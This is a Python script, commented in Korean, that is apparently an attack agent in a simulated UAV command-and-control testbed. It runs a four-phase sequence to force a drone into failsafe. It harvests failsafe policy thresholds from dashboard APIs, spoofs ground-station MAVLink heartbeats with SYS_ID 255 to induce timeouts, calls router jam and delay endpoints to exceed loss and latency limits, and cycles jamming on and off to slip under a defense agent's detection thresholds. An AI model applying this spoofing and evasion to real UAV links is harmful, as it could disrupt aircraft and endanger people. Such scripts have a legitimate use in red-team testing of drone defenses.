"""
Fail-safe 유도 에이전트
Phase 0  정찰   — GET /api/live + /api/failsafe 로 정책값 수집
Phase 1  HB 누락 — GCS 위장 heartbeat를 timeout 이상 간격으로 전송 → 누락
Phase 2  손실률  — Router JAM API로 loss_pct critical 이상 주입
Phase 3  지연    — Router DELAY API로 cmd_latency critical 이상 주입
Phase 4  간헐적  — JAM ON/OFF 사이클 반복 → 방어 탐지 패턴 우회 + 누적 오차
"""
import json
import os
import socket
import time
import urllib.request

os.environ['MAVLINK20'] = '1'
from pymavlink import mavutil

DASHBOARD_HOST = os.getenv("DASHBOARD_HOST", "dah-dashboard")
DASHBOARD_PORT = int(os.getenv("DASHBOARD_PORT", "14571"))
ROUTER_HOST    = os.getenv("ROUTER_HOST", "dah-tactical-router")

UAV_HOST   = "172.20.0.10"
UAV_PORT   = 14551
GCS_SYS_ID = 255   # 정상 GCS SYS_ID로 위장

_evt_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


def _send(source, message, detail="", status="", level="warn"):
    evt = {
        "platform_type": "AGENT",
        "agent_type":    "ATK",
        "platform_id":   "ATK-FSI",
        "source":        source,
        "message":       message,
        "detail":        detail,
        "level":         level,
        "status":        status,
        "time":          time.strftime("%H:%M:%S"),
    }
    try:
        _evt_sock.sendto(json.dumps(evt).encode(), (DASHBOARD_HOST, DASHBOARD_PORT))
    except Exception:
        pass


def _router_post(path: str, body: dict):
    url = f"http://{ROUTER_HOST}:8080{path}"
    req = urllib.request.Request(
        url,
        data=json.dumps(body).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    urllib.request.urlopen(req, timeout=2)


# ── Phase 0: 정찰 ─────────────────────────────────────────────────────────────

def recon() -> dict:
    base = f"http://{DASHBOARD_HOST}:8080"
    _send("RECON", "정찰 시작 — API 정책 수집", level="info", status="OK")

    live, policy = {}, {}
    try:
        with urllib.request.urlopen(f"{base}/api/live", timeout=2) as r:
            live = json.loads(r.read())
    except Exception as e:
        print(f"[FSI-RECON] /api/live 실패: {e}")

    try:
        with urllib.request.urlopen(f"{base}/api/failsafe", timeout=2) as r:
            policy = json.loads(r.read())
    except Exception as e:
        print(f"[FSI-RECON] /api/failsafe 실패: {e}")

    pmap = {p["platform_id"]: p for p in live.get("platforms", [])}
    uav  = pmap.get("UAV-001", {})

    result = {
        "current_loss_pct":    uav.get("ticn", {}).get("loss_pct", 0),
        "current_lq":          uav.get("ticn", {}).get("link_quality", 100),
        "hb_timeout_sec":      policy.get("heartbeat", {}).get("timeout_sec", 5),
        "hb_interval_sec":     policy.get("heartbeat", {}).get("interval_sec", 1),
        "hb_max_miss":         policy.get("heartbeat", {}).get("max_miss_count", 5),
        "loss_warning_pct":    policy.get("packet_loss", {}).get("warning_pct", 10),
        "loss_critical_pct":   policy.get("packet_loss", {}).get("critical_pct", 15),
        "loss_duration_sec":   policy.get("packet_loss", {}).get("critical_duration_sec", 2),
        "latency_warning_ms":  policy.get("latency", {}).get("warning_ms", 500),
        "latency_critical_ms": policy.get("latency", {}).get("critical_ms", 1500),
        "failsafe_action":     policy.get("failsafe_action", "LOITER"),
    }

    _send("RECON",
          "정찰 완료 — 취약 정책값 확보",
          detail=(
              f"HB timeout={result['hb_timeout_sec']}s  max_miss={result['hb_max_miss']}회  "
              f"loss critical={result['loss_critical_pct']}%  "
              f"latency critical={result['latency_critical_ms']}ms  "
              f"failsafe={result['failsafe_action']}"
          ),
          status="ALERT")
    print(f"[FSI-RECON] 정책값: {result}")
    return result


# ── Phase 1: Heartbeat 누락 유도 ──────────────────────────────────────────────

def attack_hb_suppress(policy: dict, duration_sec: int = 20):
    """
    GCS(SYS_ID=255)인 척 heartbeat를 1개 전송 후
    timeout_sec + 2초 동안 침묵 → UAV heartbeat timeout 발생
    """
    silence = policy["hb_timeout_sec"] + 2

    mav = mavutil.mavlink_connection(
        f"udpout:{UAV_HOST}:{UAV_PORT}",
        source_system=GCS_SYS_ID,
    )

    _send("HB-SUPPRESS",
          "Heartbeat 누락 유도 시작",
          detail=f"GCS SYS_ID=255 위장, 전송 간격={silence}s (timeout 기준={policy['hb_timeout_sec']}s)",
          status="INJECTED")

    deadline = time.time() + duration_sec
    while time.time() < deadline:
        mav.mav.heartbeat_send(
            type=mavutil.mavlink.MAV_TYPE_GCS,
            autopilot=mavutil.mavlink.MAV_AUTOPILOT_INVALID,
            base_mode=0,
            custom_mode=0,
            system_status=mavutil.mavlink.MAV_STATE_ACTIVE,
        )
        print(f"[FSI-HB] heartbeat 1개 전송 → {silence}s 침묵 (timeout 유도)")
        time.sleep(silence)   # timeout 기준 초과 → UAV가 GCS 연결 두절로 판단

    _send("HB-SUPPRESS", "Heartbeat 누락 유도 종료", level="info", status="OK")


# ── Phase 2: 패킷 손실률 증가 ─────────────────────────────────────────────────

def attack_loss_inject(policy: dict, duration_sec: int = 20):
    """
    loss_pct를 critical 기준 + 30%p 로 주입
    VHF / UHF 동시 재밍 → TICN link_quality 급락 → UAV LOITER 전환
    """
    target = policy["loss_critical_pct"] + 30

    _send("LOSS-INJECT",
          "패킷 손실률 주입 시작",
          detail=f"loss_pct 목표={target}%  (critical 기준={policy['loss_critical_pct']}%)",
          status="INJECTED")

    _router_post("/api/ticn/jam", {"channel": "VHF", "duration": duration_sec})
    _router_post("/api/ticn/jam", {"channel": "UHF", "duration": duration_sec})
    print(f"[FSI-LOSS] VHF+UHF 동시 재밍 → loss={target}% {duration_sec}s 유지")
    time.sleep(duration_sec)

    _send("LOSS-INJECT", "패킷 손실률 주입 종료", level="info", status="OK")


# ── Phase 3: 지연시간 증가 ────────────────────────────────────────────────────

def attack_latency_inject(policy: dict, duration_sec: int = 20):
    """
    Router의 /api/ticn/delay 엔드포인트로 C2 패킷에 인위적 지연 삽입
    critical_ms 이상 → UAV stale command 실행 → 임무 판단 오류
    """
    target_ms = policy["latency_critical_ms"] + 500

    _send("LATENCY-INJECT",
          "지연시간 주입 시작",
          detail=f"delay={target_ms}ms  (critical 기준={policy['latency_critical_ms']}ms)",
          status="INJECTED")

    _router_post("/api/ticn/delay", {"delay_ms": target_ms, "duration": duration_sec})
    print(f"[FSI-LAT] delay={target_ms}ms 주입 → {duration_sec}s 유지")
    time.sleep(duration_sec)

    _router_post("/api/ticn/delay", {"delay_ms": 0, "duration": 0})  # 해제
    _send("LATENCY-INJECT", "지연시간 주입 종료", level="info", status="OK")


# ── Phase 4: 간헐적 링크 저하 ─────────────────────────────────────────────────

def attack_intermittent(policy: dict, cycles: int = 5, jam_sec: int = 8, clear_sec: int = 5):
    """
    JAM ON → CLEAR 사이클 반복
    - 방어 에이전트의 연속 탐지 임계값을 회피
    - 짧은 LOITER 복귀 사이클 반복 → 임무 좌표 오차 누적
    """
    _send("INTERMITTENT",
          "간헐적 링크 저하 시작",
          detail=f"JAM {jam_sec}s → CLEAR {clear_sec}s  ×{cycles}회 반복",
          status="INJECTED")

    for i in range(cycles):
        print(f"[FSI-INT] [{i+1}/{cycles}] JAM ON → VHF {jam_sec}s")
        _router_post("/api/ticn/jam", {"channel": "VHF", "duration": jam_sec})
        time.sleep(jam_sec)

        print(f"[FSI-INT] [{i+1}/{cycles}] CLEAR → {clear_sec}s 복구 대기")
        _router_post("/api/ticn/clear", {"channel": "VHF"})
        time.sleep(clear_sec)

    _send("INTERMITTENT", "간헐적 링크 저하 종료", level="info", status="OK")


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    print("[FSI] Fail-safe 유도 에이전트 시작")
    _send("FSI", "Fail-safe 유도 에이전트 시작",
          detail="Phase 0→1→2→3→4 순차 실행",
          level="info", status="OK")

    time.sleep(3)

    # Phase 0: 정찰
    print("\n[FSI] ── Phase 0: 정찰 ──")
    policy = recon()

    time.sleep(3)

    # Phase 1: HB 누락
    print("\n[FSI] ── Phase 1: Heartbeat 누락 유도 ──")
    attack_hb_suppress(policy, duration_sec=20)

    time.sleep(5)

    # Phase 2: 패킷 손실률
    print("\n[FSI] ── Phase 2: 패킷 손실률 증가 ──")
    attack_loss_inject(policy, duration_sec=20)

    time.sleep(5)

    # Phase 3: 지연시간
    print("\n[FSI] ── Phase 3: 지연시간 주입 ──")
    attack_latency_inject(policy, duration_sec=20)

    time.sleep(5)

    # Phase 4: 간헐적 저하
    print("\n[FSI] ── Phase 4: 간헐적 링크 저하 ──")
    attack_intermittent(policy, cycles=5)

    _send("FSI", "전체 공격 시퀀스 완료",
          detail="4단계 fail-safe 유도 완료",
          level="warn", status="COMPLETE")
    print("\n[FSI] 전체 시퀀스 완료")


if __name__ == "__main__":
    main()
